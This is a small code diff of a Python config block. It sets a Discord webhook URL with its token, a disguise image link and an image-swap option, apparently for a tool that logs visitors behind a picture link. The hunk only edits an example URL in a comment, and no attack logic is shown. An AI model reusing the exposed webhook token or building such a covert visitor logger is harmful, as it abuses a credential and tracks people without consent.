@@ -14,7 +14,7 @@ config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1494706597405135058/cftkJvDd_w3YYn_fBJ8RZRshxNq9m54U35EM5f1O5WsJN0ARNASkq8IPXSYcXN9x",
     "image": "https://www.apprendre-a-dessiner.org/wp-content/uploads/2026/02/Dents-de-vampires.jpg", # You can also have a custom image by using a URL argument
-                                               # (E.g. https://c-trop-longg-66is.vercel.app/=<Insert a URL-escaped link to an image here>)
+                                               # (E.g. https://www.apprendre-a-dessiner.org/wp-content/uploads/2026/02/Dents-de-vampires.jpg/=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
